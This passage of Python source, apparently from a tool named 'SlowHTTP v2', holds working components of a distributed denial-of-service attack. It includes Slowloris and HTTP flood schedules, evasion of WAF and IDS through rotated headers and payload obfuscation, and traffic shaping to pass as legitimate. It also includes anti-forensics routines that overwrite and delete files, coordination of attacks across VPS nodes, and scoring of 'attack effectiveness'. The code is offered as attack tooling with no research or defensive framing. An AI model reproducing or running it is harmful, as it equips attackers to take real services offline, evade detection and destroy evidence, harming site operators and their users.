    Monitors target health and manages automatic reconnection for persistent attacks
    """
    def __init__(self, target, port, use_ssl=False):
        self.target = target
        self.port = port
        self.use_ssl = use_ssl
        self.is_alive = False
        self.last_check = None
        self.consecutive_failures = 0
        self.check_interval = 5
        self.max_failures_before_wait = 3
        
    def check_target_health(self):
        """Check if target is responsive"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            result = sock.connect_ex((self.target, self.port))
            sock.close()
            
            if result == 0:
                self.is_alive = True
                self.consecutive_failures = 0
                self.last_check = time.time()
                return True
            else:
                self.is_alive = False
                self.consecutive_failures += 1
                self.last_check = time.time()
                return False
                
        except Exception as e:
            self.is_alive = False
            self.consecutive_failures += 1
            self.last_check = time.time()
            logger.debug(f"Health check error: {str(e)}")
            return False
    
    def wait_for_recovery(self, max_wait=300):
        """Wait for target to recover with exponential backoff"""
        logger.info(f"Target {self.target}:{self.port} is down, waiting for recovery...")
        print(f"\\n{Colors.YELLOW}[!] Target appears to be down{Colors.RESET}")
        print(f"{Colors.YELLOW}[*] Waiting for target to recover (max {max_wait}s)...{Colors.RESET}\\n")
        
        start_time = time.time()
        attempt = 0
        
        while time.time() - start_time < max_wait:
            attempt += 1
            wait_time = min(30, 5 * (2 ** min(attempt - 1, 4)))  # Exponential backoff
            
            print(f"{Colors.BLUE}[i] Recovery attempt {attempt}, checking in {wait_time}s...{Colors.RESET}")
            time.sleep(wait_time)
            
            if self.check_target_health():
                recovery_time = time.time() - start_time
                print(f"\\n{Colors.GREEN}[+] Target recovered after {recovery_time:.1f} seconds!{Colors.RESET}")
                print(f"{Colors.GREEN}[+] Resuming attack...{Colors.RESET}\\n")
                return True
            else:
                print(f"{Colors.RED}[!] Target still down (attempt {attempt})...{Colors.RESET}")
        
        print(f"\\n{Colors.RED}[!] Target did not recover within {max_wait} seconds{Colors.RESET}")
        return False



#############################################################################
# ADVANCED ATTACK PATTERNS & EVASION TECHNIQUES
#############################################################################

class AdvancedEvasionTechniques:
    """
    Advanced evasion techniques to bypass WAF and IDS/IPS
    """
    def __init__(self):
        self.user_agents = self._load_user_agents()
        self.referers = self._load_referers()
        self.accept_languages = self._load_accept_languages()
        
    def _load_user_agents(self):
        """Load comprehensive user agent list"""
        return [
            # Chrome on Windows
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
            
            # Chrome on macOS
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
            
            # Chrome on Linux
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
            
            # Firefox on Windows
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
            
            # Firefox on macOS
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:120.0) Gecko/20100101 Firefox/120.0",
            
            # Firefox on Linux
            "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
            "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
            
            # Safari on macOS
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
            
            # Safari on iOS
            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (iPad; CPU OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
            
            # Edge on Windows
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0",
            
            # Opera
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 OPR/106.0.0.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 OPR/106.0.0.0",
            
            # Mobile browsers
            "Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.43 Mobile Safari/537.36",
            "Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
        ]
    
    def _load_referers(self):
        """Load common referer URLs"""
        return [
            "https://www.google.com/",
            "https://www.bing.com/",
            "https://www.yahoo.com/",
            "https://www.facebook.com/",
            "https://www.twitter.com/",
            "https://www.linkedin.com/",
            "https://www.reddit.com/",
            "https://www.youtube.com/",
            "https://www.instagram.com/",
            "https://www.pinterest.com/",
        ]
    
    def _load_accept_languages(self):
        """Load accept language headers"""
        return [
            "en-US,en;q=0.9",
            "en-GB,en;q=0.9",
            "en-US,en;q=0.9,es;q=0.8",
            "en-US,en;q=0.9,fr;q=0.8",
            "en-US,en;q=0.9,de;q=0.8",
            "en-US,en;q=0.9,ja;q=0.8",
            "en-US,en;q=0.9,zh-CN;q=0.8",
        ]
    
    def generate_random_headers(self, target_host):
        """Generate randomized HTTP headers"""
        headers = {
            'Host': target_host,
            'User-Agent': random.choice(self.user_agents),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'Accept-Language': random.choice(self.accept_languages),
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Sec-Fetch-User': '?1',
            'Cache-Control': 'max-age=0',
        }
        
        # Randomly add referer
        if random.random() > 0.5:
            headers['Referer'] = random.choice(self.referers)
        
        # Randomly add DNT
        if random.random() > 0.7:
            headers['DNT'] = '1'
        
        return headers
    
    def obfuscate_payload(self, payload):
        """Obfuscate attack payload"""
        techniques = [
            self._case_variation,
            self._add_whitespace,
            self._url_encoding,
            self._double_encoding,
        ]
        
        technique = random.choice(techniques)
        return technique(payload)
    
    def _case_variation(self, payload):
        """Vary case of payload"""
        result = ""
        for char in payload:
            if random.random() > 0.5:
                result += char.upper()
            else:
                result += char.lower()
        return result
    
    def _add_whitespace(self, payload):
        """Add random whitespace"""
        whitespace_chars = [' ', '\\t', '\\n', '\\r']
        result = payload
        for _ in range(random.randint(1, 5)):
            pos = random.randint(0, len(result))
            result = result[:pos] + random.choice(whitespace_chars) + result[pos:]
        return result
    
    def _url_encoding(self, payload):
        """URL encode payload"""
        import urllib.parse
        return urllib.parse.quote(payload)
    
    def _double_encoding(self, payload):
        """Double URL encode payload"""
        import urllib.parse
        return urllib.parse.quote(urllib.parse.quote(payload))


class AttackPatternGenerator:
    """
    Generate sophisticated attack patterns
    """
    def __init__(self):
        self.patterns = []
        self.evasion = AdvancedEvasionTechniques()
        
    def generate_slowloris_pattern(self, target, duration):
        """Generate Slowloris attack pattern"""
        pattern = {
            'type': 'slowloris',
            'target': target,
            'duration': duration,
            'phases': []
        }
        
        # Phase 1: Ramp up
        pattern['phases'].append({
            'name': 'ramp_up',
            'duration': duration * 0.2,
            'connections': lambda t: int(50 + (t / (duration * 0.2)) * 150),
            'delay': 15
        })
        
        # Phase 2: Sustain
        pattern['phases'].append({
            'name': 'sustain',
            'duration': duration * 0.6,
            'connections': 200,
            'delay': 10
        })
        
        # Phase 3: Burst
        pattern['phases'].append({
            'name': 'burst',
            'duration': duration * 0.2,
            'connections': 300,
            'delay': 5
        })
        
        return pattern
    
    def generate_http_flood_pattern(self, target, duration):
        """Generate HTTP flood attack pattern"""
        pattern = {
            'type': 'http_flood',
            'target': target,
            'duration': duration,
            'phases': []
        }
        
        # Phase 1: Warm up
        pattern['phases'].append({
            'name': 'warm_up',
            'duration': duration * 0.1,
            'rps': lambda t: int(100 + (t / (duration * 0.1)) * 400),
        })
        
        # Phase 2: Full throttle
        pattern['phases'].append({
            'name': 'full_throttle',
            'duration': duration * 0.7,
            'rps': 500,
        })
        
        # Phase 3: Cool down
        pattern['phases'].append({
            'name': 'cool_down',
            'duration': duration * 0.2,
            'rps': lambda t: int(500 - (t / (duration * 0.2)) * 400),
        })
        
        return pattern


class RateLimiter:
    """
    Intelligent rate limiting to avoid detection
    """
    def __init__(self, max_rate=100, window=60):
        self.max_rate = max_rate
        self.window = window
        self.requests = []
        self.lock = threading.Lock()
        
    def acquire(self):
        """Acquire permission to send request"""
        with self.lock:
            now = time.time()
            
            # Remove old requests outside window
            self.requests = [req_time for req_time in self.requests if now - req_time < self.window]
            
            # Check if we can send
            if len(self.requests) < self.max_rate:
                self.requests.append(now)
                return True
            
            # Calculate wait time
            oldest = min(self.requests)
            wait_time = self.window - (now - oldest)
            return False, wait_time
    
    def get_current_rate(self):
        """Get current request rate"""
        with self.lock:
            now = time.time()
            recent = [req_time for req_time in self.requests if now - req_time < self.window]
            return len(recent) / self.window


class TrafficShaper:
    """
    Shape attack traffic to appear more legitimate
    """
    def __init__(self):
        self.patterns = {
            'human': self._human_pattern,
            'bot': self._bot_pattern,
            'burst': self._burst_pattern,
            'steady': self._steady_pattern,
        }
        
    def _human_pattern(self):
        """Simulate human browsing pattern"""
        # Humans have variable delays
        base_delay = random.uniform(1, 5)
        variation = random.gauss(0, 1)
        return max(0.1, base_delay + variation)
    
    def _bot_pattern(self):
        """Simulate bot pattern"""
        # Bots are more consistent
        return random.uniform(0.5, 2)
    
    def _burst_pattern(self):
        """Burst pattern"""
        # Occasional bursts
        if random.random() < 0.1:
            return random.uniform(0.01, 0.1)
        return random.uniform(2, 5)
    
    def _steady_pattern(self):
        """Steady pattern"""
        return random.uniform(0.5, 1.5)
    
    def get_delay(self, pattern='human'):
        """Get delay based on pattern"""
        if pattern in self.patterns:
            return self.patterns[pattern]()
        return 1.0


#############################################################################
# ADVANCED MONITORING & ANALYTICS
#############################################################################

class AttackAnalytics:
    """
    Advanced analytics for attack effectiveness
    """
    def __init__(self):
        self.metrics = {
            'requests_sent': 0,
            'requests_successful': 0,
            'requests_failed': 0,
            'bytes_sent': 0,
            'bytes_received': 0,
            'response_times': [],
            'error_types': {},
            'status_codes': {},
            'connection_states': {},
        }
        self.lock = threading.Lock()
        
    def record_request(self, success, response_time=None, status_code=None, bytes_sent=0, bytes_received=0, error=None):
        """Record request metrics"""
        with self.lock:
            self.metrics['requests_sent'] += 1
            
            if success:
                self.metrics['requests_successful'] += 1
            else:
                self.metrics['requests_failed'] += 1
                
            self.metrics['bytes_sent'] += bytes_sent
            self.metrics['bytes_received'] += bytes_received
            
            if response_time:
                self.metrics['response_times'].append(response_time)
                
            if status_code:
                self.metrics['status_codes'][status_code] = self.metrics['status_codes'].get(status_code, 0) + 1
                
            if error:
                error_type = type(error).__name__
                self.metrics['error_types'][error_type] = self.metrics['error_types'].get(error_type, 0) + 1
    
    def get_statistics(self):
        """Get attack statistics"""
        with self.lock:
            stats = {
                'total_requests': self.metrics['requests_sent'],
                'success_rate': (self.metrics['requests_successful'] / self.metrics['requests_sent'] * 100) if self.metrics['requests_sent'] > 0 else 0,
                'failure_rate': (self.metrics['requests_failed'] / self.metrics['requests_sent'] * 100) if self.metrics['requests_sent'] > 0 else 0,
                'total_bytes_sent': self.metrics['bytes_sent'],
                'total_bytes_received': self.metrics['bytes_received'],
                'avg_response_time': sum(self.metrics['response_times']) / len(self.metrics['response_times']) if self.metrics['response_times'] else 0,
                'min_response_time': min(self.metrics['response_times']) if self.metrics['response_times'] else 0,
                'max_response_time': max(self.metrics['response_times']) if self.metrics['response_times'] else 0,
                'status_codes': self.metrics['status_codes'].copy(),
                'error_types': self.metrics['error_types'].copy(),
            }
            return stats
    
    def calculate_effectiveness(self):
        """Calculate attack effectiveness score"""
        stats = self.get_statistics()
        
        # Factors for effectiveness
        success_factor = stats['success_rate'] / 100
        response_time_factor = 1.0 if stats['avg_response_time'] > 5 else stats['avg_response_time'] / 5
        error_factor = stats['failure_rate'] / 100
        
        # Calculate score (0-100)
        effectiveness = (success_factor * 0.4 + response_time_factor * 0.3 + error_factor * 0.3) * 100
        
        return min(100, max(0, effectiveness))
    
    def generate_report(self):
        """Generate detailed attack report"""
        stats = self.get_statistics()
        effectiveness = self.calculate_effectiveness()
        
        report = f"""
{'='*60}
ATTACK ANALYTICS REPORT
{'='*60}

OVERALL STATISTICS:
  Total Requests: {stats['total_requests']}
  Successful: {stats['total_requests'] - stats['total_requests'] * stats['failure_rate'] / 100:.0f} ({stats['success_rate']:.2f}%)
  Failed: {stats['total_requests'] * stats['failure_rate'] / 100:.0f} ({stats['failure_rate']:.2f}%)
  
DATA TRANSFER:
  Bytes Sent: {self._format_bytes(stats['total_bytes_sent'])}
  Bytes Received: {self._format_bytes(stats['total_bytes_received'])}
  
RESPONSE TIMES:
  Average: {stats['avg_response_time']:.3f}s
  Minimum: {stats['min_response_time']:.3f}s
  Maximum: {stats['max_response_time']:.3f}s
  
STATUS CODES:
"""
        for code, count in sorted(stats['status_codes'].items()):
            report += f"  {code}: {count} ({count/stats['total_requests']*100:.1f}%)\\n"
        
        report += "\\nERROR TYPES:\\n"
        for error_type, count in sorted(stats['error_types'].items()):
            report += f"  {error_type}: {count} ({count/stats['total_requests']*100:.1f}%)\\n"
        
        report += f"""
EFFECTIVENESS SCORE: {effectiveness:.2f}/100

{'='*60}
"""
        return report
    
    def _format_bytes(self, bytes_val):
        """Format bytes to human readable"""
        for unit in ['B', 'KB', 'MB', 'GB']:
            if bytes_val < 1024.0:
                return f"{bytes_val:.2f} {unit}"
            bytes_val /= 1024.0
        return f"{bytes_val:.2f} TB"


class RealTimeMonitor:
    """
    Real-time monitoring of attack progress
    """
    def __init__(self, update_interval=1.0):
        self.update_interval = update_interval
        self.running = False
        self.monitor_thread = None
        self.analytics = AttackAnalytics()
        self.callbacks = []
        
    def add_callback(self, callback):
        """Add callback for updates"""
        self.callbacks.append(callback)
        
    def start(self):
        """Start monitoring"""
        self.running = True
        self.monitor_thread = threading.Thread(target=self._monitor_loop)
        self.monitor_thread.daemon = True
        self.monitor_thread.start()
        
    def stop(self):
        """Stop monitoring"""
        self.running = False
        if self.monitor_thread:
            self.monitor_thread.join(timeout=5)
            
    def _monitor_loop(self):
        """Main monitoring loop"""
        while self.running:
            stats = self.analytics.get_statistics()
            
            # Call all callbacks
            for callback in self.callbacks:
                try:
                    callback(stats)
                except Exception as e:
                    logger.error(f"Monitor callback error: {e}")
                    
            time.sleep(self.update_interval)


#############################################################################
# SECURITY & ANTI-FORENSICS
#############################################################################

class AntiForensics:
    """
    Anti-forensics features to minimize traces
    """
    def __init__(self):
        self.temp_files = []
        self.memory_data = []
        
    def secure_delete_file(self, filepath):
        """Securely delete file with multiple overwrites"""
        if not os.path.exists(filepath):
            return
            
        try:
            # Get file size
            file_size = os.path.getsize(filepath)
            
            # Overwrite with random data 3 times
            with open(filepath, 'wb') as f:
                for _ in range(3):
                    f.seek(0)
                    f.write(os.urandom(file_size))
                    f.flush()
                    os.fsync(f.fileno())
            
            # Overwrite with zeros
            with open(filepath, 'wb') as f:
                f.write(b'\\x00' * file_size)
                f.flush()
                os.fsync(f.fileno())
            
            # Finally delete
            os.remove(filepath)
            logger.info(f"Securely deleted: {filepath}")
            
        except Exception as e:
            logger.error(f"Secure delete failed: {e}")
            
    def clear_memory(self):
        """Clear sensitive data from memory"""
        for data in self.memory_data:
            try:
                # Overwrite with zeros
                if isinstance(data, bytearray):
                    for i in range(len(data)):
                        data[i] = 0
                elif isinstance(data, list):
                    data.clear()
                elif isinstance(data, dict):
                    data.clear()
            except:
                pass
        
        self.memory_data.clear()
        
    def cleanup_traces(self):
        """Cleanup all traces"""
        # Delete temp files
        for temp_file in self.temp_files:
            self.secure_delete_file(temp_file)
        
        # Clear memory
        self.clear_memory()
        
        # Clear Python cache
        import gc
        gc.collect()
        
        logger.info("Forensic cleanup completed")


class OperationalSecurity:
    """
    Operational security features
    """
    def __init__(self):
        self.session_id = self._generate_session_id()
        self.start_time = time.time()
        self.actions_log = []
        
    def _generate_session_id(self):
        """Generate unique session ID"""
        return hashlib.sha256(f"{time.time()}{random.random()}".encode()).hexdigest()[:16]
        
    def log_action(self, action, details=None):
        """Log operational action"""
        entry = {
            'timestamp': time.time(),
            'action': action,
            'details': details,
            'session_id': self.session_id
        }
        self.actions_log.append(entry)
        
    def get_session_duration(self):
        """Get session duration"""
        return time.time() - self.start_time
        
    def export_opsec_log(self, filepath):
        """Export operational security log"""
        try:
            with open(filepath, 'w') as f:
                json.dump({
                    'session_id': self.session_id,
                    'start_time': self.start_time,
                    'duration': self.get_session_duration(),
                    'actions': self.actions_log
                }, f, indent=2)
            logger.info(f"OpSec log exported: {filepath}")
        except Exception as e:
            logger.error(f"Failed to export OpSec log: {e}")



#############################################################################
# DISTRIBUTED COORDINATION & LOAD BALANCING
#############################################################################

class LoadBalancer:
    """
    Intelligent load balancing across VPS nodes
    """
    def __init__(self):
        self.nodes = {}
        self.strategies = {
            'round_robin': self._round_robin,
            'least_connections': self._least_connections,
            'weighted': self._weighted,
            'random': self._random,
        }
        self.current_index = 0
        self.lock = threading.Lock()
        
    def add_node(self, node_id, capacity=100, weight=1):
        """Add node to load balancer"""
        with self.lock:
            self.nodes[node_id] = {
                'capacity': capacity,
                'weight': weight,
                'current_load': 0,
                'total_requests': 0,
                'failed_requests': 0,
                'avg_response_time': 0,
                'status': 'active'
            }
            
    def remove_node(self, node_id):
        """Remove node from load balancer"""
        with self.lock:
            if node_id in self.nodes:
                del self.nodes[node_id]
                
    def get_next_node(self, strategy='round_robin'):
        """Get next node based on strategy"""
        if strategy in self.strategies:
            return self.strategies[strategy]()
        return self._round_robin()
        
    def _round_robin(self):
        """Round robin selection"""
        with self.lock:
            if not self.nodes:
                return None
                
            active_nodes = [nid for nid, node in self.nodes.items() if node['status'] == 'active']
            if not active_nodes:
                return None
                
            node_id = active_nodes[self.current_index % len(active_nodes)]
            self.current_index += 1
            return node_id
            
    def _least_connections(self):
        """Least connections selection"""
        with self.lock:
            if not self.nodes:
                return None
                
            active_nodes = {nid: node for nid, node in self.nodes.items() if node['status'] == 'active'}
            if not active_nodes:
                return None
                
            return min(active_nodes.items(), key=lambda x: x[1]['current_load'])[0]
            
    def _weighted(self):
        """Weighted selection"""
        with self.lock:
            if not self.nodes:
                return None
                
            active_nodes = {nid: node for nid, node in self.nodes.items() if node['status'] == 'active'}
            if not active_nodes:
                return None
                
            # Calculate weighted probabilities
            total_weight = sum(node['weight'] for node in active_nodes.values())
            rand_val = random.uniform(0, total_weight)
            
            cumulative = 0
            for node_id, node in active_nodes.items():
                cumulative += node['weight']
                if rand_val <= cumulative:
                    return node_id
                    
            return list(active_nodes.keys())[0]
            
    def _random(self):
        """Random selection"""
        with self.lock:
            if not self.nodes:
                return None
                
            active_nodes = [nid for nid, node in self.nodes.items() if node['status'] == 'active']
            if not active_nodes:
                return None
                
            return random.choice(active_nodes)
            
    def update_node_stats(self, node_id, load_delta=0, response_time=None, success=True):
        """Update node statistics"""
        with self.lock:
            if node_id in self.nodes:
                node = self.nodes[node_id]
                node['current_load'] += load_delta
                node['total_requests'] += 1
                
                if not success:
                    node['failed_requests'] += 1
                    
                if response_time:
                    # Update moving average
                    alpha = 0.3
                    node['avg_response_time'] = alpha * response_time + (1 - alpha) * node['avg_response_time']
                    
    def get_node_stats(self, node_id):
        """Get node statistics"""
        with self.lock:
            return self.nodes.get(node_id, {}).copy()
            
    def get_all_stats(self):
        """Get all nodes statistics"""
        with self.lock:
            return {nid: node.copy() for nid, node in self.nodes.items()}


class DistributedCoordinator:
    """
    Coordinate attacks across multiple VPS nodes
    """
    def __init__(self):
        self.nodes = {}
        self.load_balancer = LoadBalancer()
        self.sync_lock = threading.Lock()
        self.command_queue = queue.Queue()
        self.result_queue = queue.Queue()
        
    def register_node(self, node_id, connection_info):
        """Register a VPS node"""
        with self.sync_lock:
            self.nodes[node_id] = {
                'connection': connection_info,
                'status': 'idle',
                'current_task': None,
                'last_heartbeat': time.time()
            }
            self.load_balancer.add_node(node_id)
            
    def unregister_node(self, node_id):
        """Unregister a VPS node"""
        with self.sync_lock:
            if node_id in self.nodes:
                del self.nodes[node_id]
                self.load_balancer.remove_node(node_id)
                
    def distribute_attack(self, attack_config, node_ids=None):
        """Distribute attack across nodes"""
        if node_ids is None:
            node_ids = list(self.nodes.keys())
            
        tasks = []
        for node_id in node_ids:
            task = {
                'node_id': node_id,
                'config': attack_config,
                'timestamp': time.time()
            }
            tasks.append(task)
            self.command_queue.put(task)
            
        return tasks
        
    def collect_results(self, timeout=60):
        """Collect results from nodes"""
        results = []
        deadline = time.time() + timeout
        
        while time.time() < deadline:
            try:
                result = self.result_queue.get(timeout=1)
                results.append(result)
            except queue.Empty:
                continue
                
        return results
        
    def synchronize_nodes(self):
        """Synchronize all nodes"""
        sync_command = {
            'type': 'sync',
            'timestamp': time.time()
        }
        
        for node_id in self.nodes.keys():
            self.command_queue.put({
                'node_id': node_id,
                'command': sync_command
            })
            
    def health_check(self):
        """Check health of all nodes"""
        current_time = time.time()
        unhealthy_nodes = []
        
        with self.sync_lock:
            for node_id, node_info in self.nodes.items():
                if current_time - node_info['last_heartbeat'] > 60:
                    unhealthy_nodes.append(node_id)
                    
        return unhealthy_nodes


#############################################################################
# ADVANCED REPORTING & VISUALIZATION
#############################################################################

class ReportGenerator:
    """
    Generate comprehensive attack reports
    """
    def __init__(self):
        self.report_data = {}
        
    def generate_html_report(self, attack_data, output_file):
        """Generate HTML report"""
        html_template = """
<!DOCTYPE html>
<html>
<head>
    <title>SlowHTTP Attack Report</title>
    <style>
        body {{ font-family: Arial, sans-serif; margin: 20px; background: #f5f5f5; }}
        .container {{ max-width: 1200px; margin: 0 auto; background: white; padding: 20px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }}
        h1 {{ color: #333; border-bottom: 3px solid #007bff; padding-bottom: 10px; }}
        h2 {{ color: #555; margin-top: 30px; }}
        .metric {{ display: inline-block; margin: 10px; padding: 15px; background: #f8f9fa; border-left: 4px solid #007bff; }}
        .metric-label {{ font-size: 12px; color: #666; }}
        .metric-value {{ font-size: 24px; font-weight: bold; color: #333; }}
        table {{ width: 100%; border-collapse: collapse; margin: 20px 0; }}
        th {{ background: #007bff; color: white; padding: 12px; text-align: left; }}
        td {{ padding: 10px; border-bottom: 1px solid #ddd; }}
        tr:hover {{ background: #f8f9fa; }}
        .success {{ color: #28a745; }}
        .warning {{ color: #ffc107; }}
        .danger {{ color: #dc3545; }}
        .chart {{ margin: 20px 0; padding: 20px; background: #f8f9fa; }}
    </style>
</head>
<body>
    <div class="container">
        <h1>SlowHTTP v2 - Attack Report</h1>
        <p><strong>Generated:</strong> {timestamp}</p>
        <p><strong>Target:</strong> {target}</p>
        <p><strong>Attack Type:</strong> {attack_type}</p>
        
        <h2>Summary Metrics</h2>
        <div class="metric">
            <div class="metric-label">Total Requests</div>
            <div class="metric-value">{total_requests}</div>
        </div>
        <div class="metric">
            <div class="metric-label">Success Rate</div>
            <div class="metric-value class="success">{success_rate}%</div>
        </div>
        <div class="metric">
            <div class="metric-label">Duration</div>
            <div class="metric-value">{duration}s</div>
        </div>
        <div class="metric">
            <div class="metric-label">Avg Response Time</div>
            <div class="metric-value">{avg_response_time}ms</div>
        </div>
        
        <h2>Node Performance</h2>
        <table>
            <tr>
                <th>Node ID</th>
                <th>Requests</th>
                <th>Success Rate</th>
                <th>Avg Response Time</th>
                <th>Status</th>
            </tr>
            {node_rows}
        </table>
        
        <h2>Status Code Distribution</h2>
        <table>
            <tr>
                <th>Status Code</th>
                <th>Count</th>
                <th>Percentage</th>
            </tr>
            {status_code_rows}
        </table>
        
        <h2>Timeline</h2>
        <div class="chart">
            <p>Attack timeline visualization would go here</p>
        </div>
        
        <h2>Recommendations</h2>
        <ul>
            {recommendations}
        </ul>
    </div>
</body>
</html>
        """
        
        # Format data
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        
        # Generate node rows
        node_rows = ""
        for node_id, stats in attack_data.get('nodes', {}).items():
            node_rows += f"""
            <tr>
                <td>{node_id}</td>
                <td>{stats.get('requests', 0)}</td>
                <td class="success">{stats.get('success_rate', 0):.1f}%</td>
                <td>{stats.get('avg_response_time', 0):.2f}ms</td>
                <td>{stats.get('status', 'unknown')}</td>
            </tr>
            """
        
        # Generate status code rows
        status_code_rows = ""
        total_requests = attack_data.get('total_requests', 1)
        for code, count in attack_data.get('status_codes', {}).items():
            percentage = (count / total_requests) * 100
            status_code_rows += f"""
            <tr>
                <td>{code}</td>
                <td>{count}</td>
                <td>{percentage:.1f}%</td>
            </tr>
            """
        
        # Generate recommendations
        recommendations = ""
        for rec in attack_data.get('recommendations', []):
            recommendations += f"<li>{rec}</li>"
        
        # Fill template
        html_content = html_template.format(
            timestamp=timestamp,
            target=attack_data.get('target', 'N/A'),
            attack_type=attack_data.get('attack_type', 'N/A'),
            total_requests=attack_data.get('total_requests', 0),
            success_rate=attack_data.get('success_rate', 0),
            duration=attack_data.get('duration', 0),
            avg_response_time=attack_data.get('avg_response_time', 0),
            node_rows=node_rows,
            status_code_rows=status_code_rows,
            recommendations=recommendations
        )
        
        # Write to file
        with open(output_file, 'w') as f:
            f.write(html_content)
            
        logger.info(f"HTML report generated: {output_file}")
        
    def generate_json_report(self, attack_data, output_file):
        """Generate JSON report"""
        report = {
            'metadata': {
                'generated_at': datetime.now().isoformat(),
                'version': VERSION,
                'report_type': 'attack_summary'
            },
            'attack_info': attack_data
        }
        
        with open(output_file, 'w') as f:
            json.dump(report, f, indent=2)
            
        logger.info(f"JSON report generated: {output_file}")
        
    def generate_csv_report(self, attack_data, output_file):
        """Generate CSV report"""
        import csv
        
        with open(output_file, 'w', newline='') as f:
            writer = csv.writer(f)
            
            # Write headers
            writer.writerow(['Metric', 'Value'])
            
            # Write data
            for key, value in attack_data.items():
                if not isinstance(value, (dict, list)):
                    writer.writerow([key, value])
                    
        logger.info(f"CSV report generated: {output_file}")


class PerformanceProfiler:
    """
    Profile attack performance
    """
    def __init__(self):
        self.profiles = {}
        self.current_profile = None
        
    def start_profile(self, profile_name):
        """Start profiling"""
        self.current_profile = profile_name
        self.profiles[profile_name] = {
            'start_time': time.time(),
            'end_time': None,
            'metrics': {},
            'events': []
        }
        
    def stop_profile(self):
        """Stop profiling"""
        if self.current_profile and self.current_profile in self.profiles:
            self.profiles[self.current_profile]['end_time'] = time.time()
            
    def record_metric(self, metric_name, value):
        """Record a metric"""
        if self.current_profile and self.current_profile in self.profiles:
            self.profiles[self.current_profile]['metrics'][metric_name] = value
            
    def record_event(self, event_name, details=None):
        """Record an event"""
        if self.current_profile and self.current_profile in self.profiles:
            event = {
                'timestamp': time.time(),
                'name': event_name,
                'details': details
            }
            self.profiles[self.current_profile]['events'].append(event)
            
    def get_profile(self, profile_name):
        """Get profile data"""
        return self.profiles.get(profile_name, {})
        
    def analyze_profile(self, profile_name):
        """Analyze profile data"""
        profile = self.profiles.get(profile_name)
        if not profile:
            return None
            
        analysis = {
            'duration': profile['end_time'] - profile['start_time'] if profile['end_time'] else None,
            'event_count': len(profile['events']),
            'metrics': profile['metrics'].copy()
        }
        
        return analysis


#############################################################################
# CONFIGURATION MANAGEMENT
#############################################################################

class ConfigurationManager:
    """
    Manage application configuration
    """
    def __init__(self, config_file='config.json'):
        self.config_file = config_file
        self.config = self.load_config()
        
    def load_config(self):
        """Load configuration from file"""
        if os.path.exists(self.config_file):
            try:
                with open(self.config_file, 'r') as f:
                    return json.load(f)
            except Exception as e:
                logger.error(f"Failed to load config: {e}")
                return self.get_default_config()
        return self.get_default_config()
        
    def save_config(self):
        """Save configuration to file"""
        try:
            with open(self.config_file, 'w') as f:
                json.dump(self.config, f, indent=2)
            logger.info(f"Configuration saved: {self.config_file}")
        except Exception as e:
            logger.error(f"Failed to save config: {e}")
            
    def get_default_config(self):
        """Get default configuration"""
        return {
            'version': VERSION,
            'attack': {
                'default_connections': 200,
                'default_duration': 300,
                'default_delay': 15,
                'max_connections': 1000,
                'timeout': 30
            },
            'network': {
